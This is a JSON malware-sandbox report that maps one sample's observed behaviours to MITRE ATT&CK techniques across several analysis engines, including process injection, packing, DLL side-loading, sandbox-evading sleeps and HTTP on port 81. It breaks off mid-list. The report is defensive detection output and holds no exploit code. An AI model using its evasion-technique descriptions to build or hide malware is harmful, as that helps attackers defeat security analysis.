{"data": {"CAPA": {"tactics": [{"id": "TA0002", "name": "Execution", "link": "https://attack.mitre.org/tactics/TA0002/", "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ", "techniques": [{"id": "T1129", "name": "Shared Modules", "link": "https://attack.mitre.org/techniques/T1129/", "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.", "signatures": [{"severity": "INFO", "description": "parse PE header"}]}]}]}, "CAPE Sandbox": {"tactics": [{"id": "TA0011", "name": "Command and Control", "link": "https://attack.mitre.org/tactics/TA0011/", "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim\u2019s network structure and defenses.", "techniques": [{"id": "T1071", "name": "Application Layer Protocol", "link": "https://attack.mitre.org/techniques/T1071/", "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ", "signatures": [{"severity": "UNKNOWN", "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."}]}]}, {"id": "TA0004", "name": "Privilege Escalation", "link": "https://attack.mitre.org/tactics/TA0004/", "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ", "techniques": [{"id": "T1055", "name": "Process Injection", "link": "https://attack.mitre.org/techniques/T1055/", "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ", "signatures": [{"severity": "UNKNOWN", "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."}]}]}, {"id": "TA0005", "name": "Defense Evasion", "link": "https://attack.mitre.org/tactics/TA0005/", "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ", "techniques": [{"id": "T1055", "name": "Process Injection", "link": "https://attack.mitre.org/techniques/T1055/", "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ", "signatures": [{"severity": "UNKNOWN", "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."}]}, {"id": "T1027", "name": "Obfuscated Files or Information", "link": "https://attack.mitre.org/techniques/T1027/", "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ", "signatures": [{"severity": "UNKNOWN", "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit."}]}, {"id": "T1027.002", "name": "Software Packing", "link": "https://attack.mitre.org/techniques/T1027/002/", "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ", "signatures": [{"severity": "UNKNOWN", "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code."}]}]}]}, "Yomi Hunter": {"tactics": [{"id": "TA0002", "name": "Execution", "link": "https://attack.mitre.org/tactics/TA0002/", "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ", "techniques": [{"id": "T1129", "name": "Shared Modules", "link": "https://attack.mitre.org/techniques/T1129/", "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.", "signatures": [{"severity": "UNKNOWN", "description": "The process attempted to dynamically load a malicious function"}, {"severity": "UNKNOWN", "description": "The process tried to load dynamically one or more functions."}]}]}, {"id": "TA0005", "name": "Defense Evasion", "link": "https://attack.mitre.org/tactics/TA0005/", "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ", "techniques": [{"id": "T1045", "name": "Software Packing", "link": "https://attack.mitre.org/techniques/T1045/", "description": "Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.\nAdversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.", "signatures": [{"severity": "UNKNOWN", "description": "Manalize Local SandBox Packer Harvesting"}]}]}, {"id": "TA0007", "name": "Discovery", "link": "https://attack.mitre.org/tactics/TA0007/", "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what\u2019s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ", "techniques": [{"id": "T1082", "name": "System Information Discovery", "link": "https://attack.mitre.org/techniques/T1082/", "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). On ESXi servers, threat actors may gather system information from various esxcli utilities, such as system hostname get, system version get, and storage filesystem list (to list storage volumes).\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.\nSystem Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment. ", "signatures": [{"severity": "UNKNOWN", "description": "Queries for the computername"}]}, {"id": "T1063", "name": "Security Software Discovery", "link": "https://attack.mitre.org/techniques/T1063/", "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nWindows\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.\nMac\nIt's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.", "signatures": [{"severity": "UNKNOWN", "description": "It Tries to detect injection methods"}]}]}]}, "Zenbox": {"tactics": [{"id": "TA0003", "name": "Persistence", "link": "https://attack.mitre.org/tactics/TA0003/", "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ", "techniques": [{"id": "T1574", "name": "Hijack Execution Flow", "link": "https://attack.mitre.org/techniques/T1574/", "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads."}, {"id": "T1574.002", "name": "DLL Side-Loading", "link": "https://attack.mitre.org/techniques/T1574/002/", "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.", "signatures": [{"severity": "INFO", "description": "Tries to load missing DLLs", "match_data": ["apphelp.dll", "wininet.dll", "cryptsp.dll", "rsaenh.dll", "cryptbase.dll", "sspicli.dll", "mswsock.dll", "iertutil.dll", "windows.storage.dll", "wldp.dll", "profapi.dll", "kernel.appcore.dll", "ondemandconnroutehelper.dll", "winhttp.dll", "iphlpapi.dll", "winnsi.dll"]}]}]}, {"id": "TA0004", "name": "Privilege Escalation", "link": "https://attack.mitre.org/tactics/TA0004/", "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ", "techniques": [{"id": "T1574", "name": "Hijack Execution Flow", "link": "https://attack.mitre.org/techniques/T1574/", "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads."}, {"id": "T1574.002", "name": "DLL Side-Loading", "link": "https://attack.mitre.org/techniques/T1574/002/", "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.", "signatures": [{"severity": "INFO", "description": "Tries to load missing DLLs", "match_data": ["apphelp.dll", "wininet.dll", "cryptsp.dll", "rsaenh.dll", "cryptbase.dll", "sspicli.dll", "mswsock.dll", "iertutil.dll", "windows.storage.dll", "wldp.dll", "profapi.dll", "kernel.appcore.dll", "ondemandconnroutehelper.dll", "winhttp.dll", "iphlpapi.dll", "winnsi.dll"]}]}]}, {"id": "TA0005", "name": "Defense Evasion", "link": "https://attack.mitre.org/tactics/TA0005/", "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ", "techniques": [{"id": "T1574", "name": "Hijack Execution Flow", "link": "https://attack.mitre.org/techniques/T1574/", "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads."}, {"id": "T1574.002", "name": "DLL Side-Loading", "link": "https://attack.mitre.org/techniques/T1574/002/", "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.", "signatures": [{"severity": "INFO", "description": "Tries to load missing DLLs", "match_data": ["apphelp.dll", "wininet.dll", "cryptsp.dll", "rsaenh.dll", "cryptbase.dll", "sspicli.dll", "mswsock.dll", "iertutil.dll", "windows.storage.dll", "wldp.dll", "profapi.dll", "kernel.appcore.dll", "ondemandconnroutehelper.dll", "winhttp.dll", "iphlpapi.dll", "winnsi.dll"]}]}, {"id": "T1497", "name": "Virtualization/Sandbox Evasion", "link": "https://attack.mitre.org/techniques/T1497/", "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.", "signatures": [{"severity": "INFO", "description": "May sleep (evasive loops) to hinder dynamic analysis", "match_data": ["518 > 30", "-5180000s >= -30000s", "-120000s >= -30000s", "delay time: 60000"]}, {"severity": "INFO", "description": "Contains medium sleeps (>= 30s)", "match_data": ["518 > 30", "-5180000s >= -30000s", "-120000s >= -30000s", "delay time: 60000"]}]}]}, {"id": "TA0007", "name": "Discovery", "link": "https://attack.mitre.org/tactics/TA0007/", "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what\u2019s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ", "techniques": [{"id": "T1497", "name": "Virtualization/Sandbox Evasion", "link": "https://attack.mitre.org/techniques/T1497/", "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.", "signatures": [{"severity": "INFO", "description": "May sleep (evasive loops) to hinder dynamic analysis", "match_data": ["518 > 30", "-5180000s >= -30000s", "-120000s >= -30000s", "delay time: 60000"]}, {"severity": "INFO", "description": "Contains medium sleeps (>= 30s)", "match_data": ["518 > 30", "-5180000s >= -30000s", "-120000s >= -30000s", "delay time: 60000"]}]}, {"id": "T1518", "name": "Software Discovery", "link": "https://attack.mitre.org/techniques/T1518/", "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nSuch software may be deployed widely across the environment for configuration management or security reasons, such as Software Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation."}, {"id": "T1518.001", "name": "Security Software Discovery", "link": "https://attack.mitre.org/techniques/T1518/001/", "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.", "signatures": [{"severity": "INFO", "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)", "match_data": ["Hyper-V RAW"]}]}, {"id": "T1010", "name": "Application Window Discovery", "link": "https://attack.mitre.org/techniques/T1010/", "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.", "signatures": [{"severity": "INFO", "description": "Sample monitors Window changes (e.g. starting applications), analyze the sample with the simulation cookbook"}]}, {"id": "T1082", "name": "System Information Discovery", "link": "https://attack.mitre.org/techniques/T1082/", "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). On ESXi servers, threat actors may gather system information from various esxcli utilities, such as system hostname get, system version get, and storage filesystem list (to list storage volumes).\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.\nSystem Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment. ", "signatures": [{"severity": "INFO", "description": "Queries the cryptographic machine GUID", "match_data": ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid", "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers"]}, {"severity": "INFO", "description": "Reads software policies", "match_data": ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid", "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers"]}]}]}, {"id": "TA0011", "name": "Command and Control", "link": "https://attack.mitre.org/tactics/TA0011/", "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim\u2019s network structure and defenses.", "techniques": [{"id": "T1571", "name": "Non-Standard Port", "link": "https://attack.mitre.org/techniques/T1571/", "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.", "signatures": [{"severity": "LOW", "description": "Uses network protocols on non-standard ports", "match_data": ["HTTP traffic on port 49681 -> 81", "HTTP traffic on port 81 -> 49681", "HTTP traffic on port 49682 -> 81", "HTTP traffic on port 81 -> 49682", "HTTP traffic on port 49683 -> 81", "HTTP traffic on port 81 -> 49683", "HTTP traffic on port 49685 -> 81", "HTTP traffic on port 81 -> 49685", "HTTP traffic on port 49686 -> 81", "HTTP traffic on port 81 -> 49686", "HTTP traffic on port 49687 -> 81", "HTTP traffic on port 81 -> 49687", "HTTP traffic on port 49688 -> 81", "HTTP traffic on port 81 -> 49688", "HTTP traffic on port 49689 -> 81", "HTTP traffic on port 81 -> 49689", "HTTP traffic on port 49690 -> 81", "HTTP traffic on port 81 -> 49690", "HTTP traffic on port 49691 -> 81", "HTTP traffic on port 81 -> 49691", "HTTP traffic on port 49692 -> 81", "HTTP traffic on port 81 -> 49692", "HTTP traffic on port 49693 -> 81", "HTTP traffic on port 81 -> 49693", "HTTP traffic on port 49694 -> 81", "HTTP traffic on port 81 -> 49694", "HTTP traffic on port 49695 -> 81", "HTTP traffic on port 81 -> 49695", "HTTP traffic on port 49696 -> 81", "HTTP traffic on port 81 -> 49696", "HTTP traffic on port 49697 -> 81", "HTTP traffic on port 81 -> 49697", "HTTP traffic on port 49698 -> 81", "HTTP traffic on port 81 -> 49698", "HTTP traffic on port 49699 -> 81", "HTTP traffic on port 81 -> 49699", "HTTP traffic on port 49700 -> 81", "HTTP traffic on port 81 -> 49700", "HTTP traffic on port 49701 -> 81", "HTTP traffic on port 81 -> 49701", "HTTP traffic on port 49702 -> 81", "HTTP traffic on port 81 -> 49702", "HTTP traffic on port 49703 -> 81", "HTTP traffic on port 81 -> 49703", "HTTP traffic on port 49704 -> 81", "HTTP traffic on port 81 -> 49704", "HTTP traffic on port 49705 -> 81", "HTTP traffic on port 81 -> 49705", "HTTP traffic on port 49706 -> 81", "HTTP traffic on port 81 -> 49706", "HTTP traffic on port 49707 -> 81", "HTTP traffic on port 81 -> 49707", "HTTP traffic on port 49708 -> 81", "HTTP traffic on port 81 -> 49708", "HTTP traffic on port 49709 -> 81", "HTTP traffic on port 81 -> 49709", "HTTP traffic on port 49710 -> 81", "HTTP traffic on port 81 -> 49710", "HTTP traffic on port 49711 -> 81", "HTTP traffic on port 81 -> 49711", "HTTP traffic on port 49712 -> 81", "HTTP traffic on port 81 -> 49712", "HTTP traffic on port 49714 -> 81", "HTTP traffic on port 81 -> 49714", "HTTP traffic on port 49715 -> 81", "HTTP traffic on port 81 -> 49715", "HTTP traffic on port 49716 -> 81", "HTTP traffic on port 81 -> 49716", "HTTP traffic on port 49717 -> 81", "HTTP traffic on port 81 -> 49717", "HTTP traffic on port 49718 -> 81", "HTTP traffic on port 81 -> 49718", "HTTP traffic on port 49719 -> 81", "HTTP traffic on port 81 -> 49719", "HTTP traffic on port 49721 -> 81", "HTTP traffic on port 81 -> 49721", "HTTP traffic on port 49723 -> 81", "HTTP traffic on port 81 -> 49723", "HTTP traffic on port 49724 -> 81", "HTTP traffic on port 81 -> 49724", "HTTP traffic on port 49725 -> 81", "HTTP traffic on port 81 -> 49725", "HTTP traffic on port 49726 -> 81", "HTTP traffic on port 81 -> 49726", "HTTP traffic on port 49727 -> 81", "HTTP traffic on port 81 -> 49727", "HTTP traffic on port 49728 -> 81", "HTTP traffic on port 81 -> 49728", "HTTP traffic on port 49731 -> 81", "HTTP traffic on port 81 -> 49731", "HTTP traffic on port 49732 -> 81", "HTTP traffic on port 81 -> 49732", "HTTP traffic on port 49733 -> 81", "HTTP traffic on port 81 -> 49733", "HTTP traffic on port 49734 -> 81", "HTTP traffic on port 81 -> 49734", "HTTP traffic on port 49735 -> 81", "HTTP traffic on port 81 -> 49735", "HTTP traffic on port 49736 -> 81", "HTTP traffic on port 81 -> 49736", "HTTP traffic on port 49737 -> 81", "HTTP traffic on port 81 -> 49737", "HTTP traffic on port 49738 -> 81", "HTTP traffic on port 81 -> 49738", "HTTP traffic on port 49739 -> 81", "HTTP traffic on port 81 -> 49739", "HTTP traffic on port 49740 -> 81", "HTTP traffic on port 81 -> 49740", "HTTP traffic on port 49741 -> 81", "HTTP traffic on port 81 -> 49741", "HTTP traffic on port 49742 -> 81", "HTTP traffic on port 81 -> 49742", "HTTP traffic on port 49743 -> 81", "HTTP traffic on port 81 -> 49743", "HTTP traffic on port 49744 -> 81", "HTTP traffic on port 81 -> 49744", "HTTP traffic on port 49745 -> 81", "HTTP traffic on port 81 -> 49745", "HTTP traffic on port 49746 -> 81", "HTTP traffic on port 81 -> 49746", "HTTP traffic on port 49747 -> 81", "HTTP traffic on port 81 -> 49747", "HTTP traffic on port 49748 -> 81", "HTTP traffic on port 81 -> 49748", "HTTP traffic on port 49749 -> 81", "HTTP traffic on port 81 -> 49749", "HTTP traffic on port 49750 -> 81", "HTTP traffic on port 81 -> 49750", "HTTP traffic on port 49751 -> 81", "HTTP traffic on port 81 -> 49751", "HTTP traffic on port 49752 -> 81", "HTTP traffic on port 81 -> 49752", "HTTP traffic on port 49753 -> 81", "HTTP traffic on port 81 -> 49753", "HTTP traffic on port 49754 -> 81", "HTTP traffic on port 81 -> 49754", "HTTP traffic on port 49755 -> 81", "HTTP traffic on port 81 -> 49755", "HTTP traffic on port 49756 -> 81", "HTTP traffic on port 81 -> 49756", "HTTP 